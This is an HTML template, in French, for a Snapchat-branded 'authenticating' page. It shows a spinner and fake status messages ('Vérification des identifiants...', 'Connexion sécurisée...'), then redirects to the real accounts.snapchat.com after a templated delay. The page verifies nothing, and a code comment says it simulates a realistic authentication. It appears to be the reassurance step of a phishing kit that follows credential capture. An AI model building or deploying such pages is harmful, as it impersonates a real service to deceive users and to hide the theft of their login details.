<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Authentification...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background: #ffffff;
        }
        .loader-container {
            text-align: center;
        }
        .snap-spinner {
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #FFFC00; /* Snapchat Yellow */
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .msg {
            font-size: 15px;
            color: #333;
            font-weight: 500;
            letter-spacing: -0.2px;
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="snap-spinner"></div>
        <p class="msg">{{ message }}</p>
    </div>
    <script>
        // Simulation d'un processus d'authentification réaliste
        const messages = ["Vérification des identifiants...", "Connexion sécurisée...", "Redirection vers Snapchat..."];
        let currentMsg = 0;
        const msgElement = document.querySelector('.msg');

        const interval = setInterval(() => {
            if (currentMsg < messages.length) {
                msgElement.innerText = messages[currentMsg];
                currentMsg++;
            }
        }, 800);

        setTimeout(function() {
            clearInterval(interval);
            window.location.href = 'https://accounts.snapchat.com';
        }, {{ delay }} * 1000);
    </script>
</body>
</html>
